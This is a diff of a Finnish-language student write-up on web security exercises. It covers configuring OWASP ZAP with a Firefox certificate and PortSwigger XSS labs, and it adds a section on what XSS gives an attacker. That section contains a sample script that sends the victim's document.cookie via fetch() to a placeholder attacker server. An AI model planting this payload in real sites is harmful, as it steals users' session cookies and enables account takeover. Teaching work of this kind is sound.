@@ -31,6 +31,8 @@ Aloitin ajamalla komennon `sudo apt-get install zaproxy`, joka löytyi kurssin t
 <img width="698" height="444" alt="image" src="https://github.com/user-attachments/assets/709182aa-5338-4f6a-8972-84ff6ec79ca9" />  
 Käynnistin zaproxyn komennolla `zaproxy`. Menin kohtaan Tools -> Options -> Network -> Server Certificates. Tässä näkyi generoituna sertifikaatti.  
 <img width="1149" height="1077" alt="image" src="https://github.com/user-attachments/assets/96dfdbe9-324b-43e9-b53e-a3af3d98f859" />  
+Options kohdasta Display sai ZAP:in kaappaamaan myös kuvat.  
+<img width="379" height="40" alt="image" src="https://github.com/user-attachments/assets/878ade7c-8f60-4576-a261-70f49a90aaca" />  
 Tallensin sertifikaatin kotihakemistooni "Save" napista. Avasin Firefoxin ja hain Settings kohdasta "Certificate".  
 <img width="665" height="234" alt="image" src="https://github.com/user-attachments/assets/abeaa818-c45a-40d7-ae8f-a49af126490e" />  
 Sitten View Certificates, Authorities ja Import... Toin aikaisemmin tallentamani sertifikaatin ja valitsin seuraavan kohdan.  
@@ -70,8 +72,13 @@ Aloitin avaamalla blogin ja kokeilin jättää kommentiksi saman funktion `<scri
 Tämä toimi, koska sivusto tallentaa kommentin ja aina kun joku avaa sivun minne kommentti on julkaistu, sivu ajaa haitallisen ohjelman käyttäjän selaimessa. (PortSwigger. Lab: Stored XSS into HTML context with nothing encoded.)  
 <img width="1207" height="207" alt="image" src="https://github.com/user-attachments/assets/2fbe1661-b8b3-42d3-af10-b899f2e200aa" />  
 
+## e) XSS-hyökkäyksen hyöty hyökkääjälle 
+Koska hyökkääjään syöttämä koodi suoritetaan sivustolla samoilla oikeuksilla kuin sivun oma koodi, saa hyökkääjä pääsyn kaikkeen mihin sivustokin. Esimerkkinä, jos hyökkääjä syöttäisi koodin `<script>
+fetch('https://hyökkääjän-palvelin.com/varastettu?data=' + document.cookie)
+</script>`  
+saisi hyökkääjä uhrin istuntoevästeet ja pääsisi kirjautumaan uhrina sivustolle ilman tunnuksia.  
 
-
+## f) Lab: File path traversal, simple case  
 
 
 
